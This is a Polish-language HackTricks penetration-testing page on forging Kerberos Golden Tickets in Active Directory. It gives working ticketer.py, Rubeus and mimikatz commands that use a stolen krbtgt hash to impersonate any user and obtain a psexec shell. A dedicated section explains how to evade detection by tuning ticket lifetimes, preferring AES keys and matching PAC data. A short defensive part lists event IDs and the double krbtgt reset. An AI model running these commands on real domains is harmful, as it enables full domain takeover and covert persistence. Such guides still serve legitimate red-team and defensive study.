# Golden Ticket

{{#include ../../banners/hacktricks-training.md}}

## Golden ticket

Atak **Golden Ticket** polega na **utworzeniu prawidłowego Ticket Granting Ticket (TGT) podszywającego się pod dowolnego użytkownika** z wykorzystaniem **hasha NTLM konta Active Directory (AD) krbtgt**. Technika ta jest szczególnie korzystna, ponieważ **umożliwia dostęp do dowolnej usługi lub maszyny** w domenie jako podszywający się użytkownik. Należy pamiętać, że **dane uwierzytelniające konta krbtgt nigdy nie są automatycznie aktualizowane**.<sup>[[1]](#references)</sup>

Aby **uzyskać hash NTLM** konta krbtgt, można zastosować różne metody. Można go wyodrębnić z **procesu Local Security Authority Subsystem Service (LSASS)** lub z pliku **NT Directory Services (NTDS.dit)** znajdującego się na dowolnym Domain Controllerze (DC) w domenie. Inną strategią uzyskania tego hasha jest **przeprowadzenie ataku DCsync**, który można wykonać za pomocą narzędzi takich jak **moduł lsadump::dcsync** w Mimikatz lub **skrypt secretsdump.py** z Impacket. Należy podkreślić, że do przeprowadzenia tych operacji zazwyczaj wymagane są **uprawnienia administratora domeny lub równoważny poziom dostępu**.<sup>[[2]](#references)</sup>

Chociaż hash NTLM jest w tym celu użyteczną metodą, ze względów bezpieczeństwa operacyjnego **zdecydowanie zaleca się** **fałszowanie tickets z użyciem kluczy Advanced Encryption Standard (AES) Kerberos (AES128 i AES256)**. Jest to jeszcze ważniejsze w nowoczesnych domenach, ponieważ **wykorzystanie RC4 jest stopniowo wycofywane** i znacznie wyraźniej wyróżnia się w telemetrii Kerberos.<sup>[[5]](#references)</sup>
```bash:From Linux
python ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
```

```bash:From Windows
# Rubeus
## The /ldap command will get the details from the LDAP (so you don't need to put the SID)
## The /printcmd option will print the complete command if later you want to generate a token offline
.\Rubeus.exe golden /rc4:<krbtgt_hash> /domain:<child_domain> /sid:<child_domain_sid> /sids:<parent_domain_sid>-519 /user:Administrator /ptt /ldap /nowrap /printcmd

# Example
.\Rubeus.exe golden /rc4:25b2076cda3bfd6209161a6c78a69c1c /domain:jurassic.park /sid:S-1-5-21-1339291983-1349129144-367733775 /user:stegosaurus /ptt /ldap /nowrap

#mimikatz
kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
.\Rubeus.exe ptt /ticket:ticket.kirbi
klist #List tickets in memory

# Example using aes key
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:430b2fdb13cc820d73ecf123dddd4c9d76425d4c2156b89ac551efb9d591a439 /ticket:golden.kirbi
```
### Nowoczesne uwagi dotyczące tworzenia ticketów

Jeśli to możliwe, najpierw **odpytywać LDAP i SYSVOL**, a następnie forge'ować ticket przy użyciu rzeczywistej polityki domeny i wartości PAC użytkownika zamiast wymyślać je ręcznie:<sup>[[4]](#references)</sup>
```bash
Rubeus.exe golden /aes256:<krbtgt_aes256> /user:<username> /ldap /printcmd /nowrap
```
- `/ldap` pyta DC o dane użytkownika, grup, NetBIOS i zasad używane do zbudowania bardziej realistycznego PAC.
- `/printcmd` wyświetla offline wiersz poleceń zawierający pobrane pola PAC, co jest przydatne, jeśli później chcesz sfałszować ten sam ticket bez ponownego odwoływania się do LDAP.
- `/extendedupndns` dodaje nowsze elementy `UpnDns` PAC zawierające `samAccountName` i SID konta.
- `/oldpac` usuwa nowsze bufory `Requestor` i `Attributes` PAC; jest to przydatne głównie do testów zgodności ze starszymi środowiskami, a nie jako domyślna praktyka operacyjna.

Z Linuxa nowsze wersje Impacket obsługują również dodawanie nowszych struktur PAC i ustawianie realistycznego okresu ważności:
```bash
python3 ticketer.py -aesKey <krbtgt_aes256> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-user-id 500 -groups 512,513,518,519 -duration 10 \
-extra-pac administrator
```
- `-duration` jest wyrażony w **godzinach**. Wartość domyślna to **10 lat**, co generuje dużo szumu.
- `-extra-pac` dodaje nowsze informacje PAC `UPN_DNS`.
- `-old-pac` wymusza starszy układ PAC.
- `-extra-sid` jest przydatny, gdy PAC wymaga dodatkowych identyfikatorów SID (na przykład w scenariuszach eskalacji z child do parent, które opisano w [SID-History Injection](sid-history-injection.md)).

**Po** wstrzyknięciu **golden Ticket** możesz uzyskać dostęp do udostępnionych plików **(C$)** oraz wykonywać usługi i WMI, więc możesz użyć **psexec** lub **wmiexec**, aby uzyskać shell (wygląda na to, że nie można uzyskać shell przez winrm).

### Omijanie typowych detekcji

Najczęstsze sposoby wykrywania golden ticket polegają na **inspekcji ruchu Kerberos** w sieci. Domyślnie Mimikatz **podpisuje TGT na 10 lat**, co będzie wyglądać anomalnie w kolejnych żądaniach TGS wykonywanych z jego użyciem.

`Lifetime : 3/11/2021 12:39:57 PM ; 3/9/2031 12:39:57 PM ; 3/9/2031 12:39:57 PM`

Użyj parametrów `/startoffset`, `/endin` i `/renewmax`, aby kontrolować przesunięcie początkowe, czas trwania i maksymalną liczbę odnowień (wszystkie wartości podawane w minutach).
```
Get-DomainPolicy | select -expand KerberosPolicy
```
Niestety, czas życia TGT nie jest logowany w zdarzeniach 4769, więc nie znajdziesz tych informacji w dziennikach zdarzeń systemu Windows. Możesz jednak skorelować **występowanie zdarzeń 4769 bez wcześniejszego zdarzenia 4768**. **Nie można zażądać TGS bez TGT**, a jeśli nie ma zapisu wystawienia TGT, możemy wywnioskować, że został on sfałszowany offline.

W **nowszych kompilacjach systemu Windows** identyfikatory zdarzeń **4768** i **4769** udostępniają również znacznie lepszą telemetrię **typów szyfrowania**. Sfałszowany TGT/TGS używający **RC4 (`0x17`)** w domenie, w której `krbtgt`, klienci i usługi mają już klucze AES, jest znacznie łatwiejszy do wykrycia niż jeszcze kilka lat temu. To kolejny powód, aby preferować **Golden Tickets oparty na AES** i możliwie dokładnie dopasowywać je do standardowej polityki Kerberos w domenie.

Kolejnym problemem związanym z OPSEC jest **wierność PAC**. Bilety z niemożliwymi członkostwami grup, brakującymi nowszymi buforami PAC lub metadanymi konta, które nie odpowiadają danym LDAP, są łatwiejsze do wykrycia, gdy obrońcy weryfikują zawartość PAC względem danych w AD. Jeśli potrzebujesz TGT, który wygląda tak, jakby został rzeczywiście wystawiony przez DC, zapoznaj się z:

{{#ref}}
diamond-ticket.md
{{#endref}}

Istnieją również **ograniczenia środowiskowe** dotyczące persistence. Konto `krbtgt` przechowuje **historię 2 haseł**, więc sfałszowany TGT może pozostać ważny po **pierwszym** resecie `krbtgt`, jeśli został podpisany poprzednim kluczem. Dlatego obrońcy unieważniają Golden Tickets, **dwukrotnie resetując `krbtgt`** i odczekując co najmniej maksymalny czas życia biletu w domenie między resetami.<sup>[[3]](#references)</sup>

Aby **ominąć tę detekcję**, sprawdź diamond tickets.

### Środki zaradcze

- 4624: Account Logon
- 4672: Admin Logon
- `Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List –Property`

Inne drobne działania, które mogą podjąć obrońcy, obejmują **generowanie alertów dla zdarzeń 4769 dotyczących wrażliwych użytkowników**, takich jak domyślne konto administratora domeny, oraz alertów dotyczących **użycia RC4 przez `krbtgt`** w domenach, które normalnie wystawiają bilety AES.<sup>[[5]](#references)</sup>

## References

- [1] [Kerberos (II): How to attack Kerberos?](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [2] [Kerberos: Golden Tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets)
- [3] [AD Forest Recovery - Reset the krbtgt password | Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-the-krbtgt-password)
- [4] [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [5] [Microsoft – How to manage Kerberos KDC usage of RC4 for service account ticket issuance (CVE-2026-20833)](https://support.microsoft.com/en-us/topic/how-to-manage-kerberos-kdc-usage-of-rc4-for-service-account-ticket-issuance-changes-related-to-cve-2026-20833-1ebcda33-720a-4da8-93c1-b0496e1910dc)

{{#include ../../banners/hacktricks-training.md}}
